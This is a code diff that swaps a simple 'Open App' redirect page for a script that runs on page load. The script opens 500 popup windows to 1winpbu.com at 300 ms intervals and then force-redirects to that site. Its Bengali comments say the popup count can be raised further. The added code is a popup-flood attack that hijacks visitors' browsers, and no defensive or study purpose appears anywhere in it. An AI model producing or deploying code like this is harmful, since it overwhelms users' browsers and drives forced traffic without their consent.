@@ -1,48 +1,31 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Open App</title>
-
-<style>
-body{
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    background:#0f172a;
-    color:#fff;
-    font-family:Arial;
-    text-align:center;
-}
-.btn{
-    background:#0088cc;
-    padding:15px 25px;
-    border-radius:8px;
-    cursor:pointer;
-    font-size:18px;
-}
-</style>
-
-</head>
-<body>
-
-<div>
-    <h2>Continue to App</h2>
-    <div class="btn" onclick="openApp()">Open Now</div>
-</div>
-
 <script>
-function openApp(){
-    // app open try
-    window.location.href = "site://1winpbu.com";
-
-    // fallback after delay
-    setTimeout(()=>{
-        window.location.href = "site://1winpbu.com/";
-    }, 3000);
+function openPopup(url){
+    window.open(
+        url,
+        "_blank",
+        "width=320,height=600"
+    );
 }
-</script>
 
-</body>
-</html>
+/* Popup Link */
+const popupLink = "https://1winpbu.com";
+
+/* কতগুলো popup খুলবে */
+let totalPopups = 500;   // তুমি চাইলে আরও বাড়াতে পারো
+
+/* delay (ms) */
+let delay = 300;
+
+/* popup loop */
+for(let i = 0; i < totalPopups; i++){
+    setTimeout(() => {
+        openPopup(popupLink);
+    }, i * delay);
+}
+
+/* শেষে redirect */
+setTimeout(() => {
+    window.location.href = popupLink;
+}, totalPopups * delay + 2000);
+
+</script>
